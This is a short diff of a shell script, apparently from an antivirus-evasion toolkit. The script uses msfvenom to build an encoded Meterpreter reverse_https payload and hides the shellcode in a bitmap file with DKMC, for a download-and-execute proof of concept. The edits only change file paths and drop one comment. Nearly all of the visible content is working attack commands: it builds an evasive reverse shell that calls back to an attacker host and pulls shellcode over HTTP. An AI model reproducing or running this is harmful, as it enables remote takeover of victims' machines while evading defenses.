@@ -7,7 +7,6 @@
 # which is nice, this is hiding the shellcode in a valid bitmap file
 # DKMC has to be in a directory side by side to avet eg. ~/tools/avet ~/tools/DKMC for running this script
 # for more look here https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/
-# please note that the bmp file will be written to /var/www/html/sc.bmp
 
 # The generated shellcode must be hosted on a HTTP server.
 # Call your executable like:
@@ -32,9 +31,9 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, format correct for DKMC and run DKMC for making the bitmap file
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > output/sc_c.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
 cd ../DKMC
-printf "gen\nset output ../avet/output/sc.bmp\nset shellcode %s\nrun\nexit\nexit\n" `../avet/tools/sh_format/sh_format output/sc_c.txt | tr -d "\n" | tr -d ";" | tr -d "\""` | python dkmc.py
+printf "gen\nset output ../avet/output/sc.bmp\nset shellcode %s\nrun\nexit\nexit\n" `../avet/tools/sh_format/sh_format input/sc_c.txt | tr -d "\n" | tr -d ";" | tr -d "\""` | python dkmc.py
 cd ../avet
 
 # set shellcode source
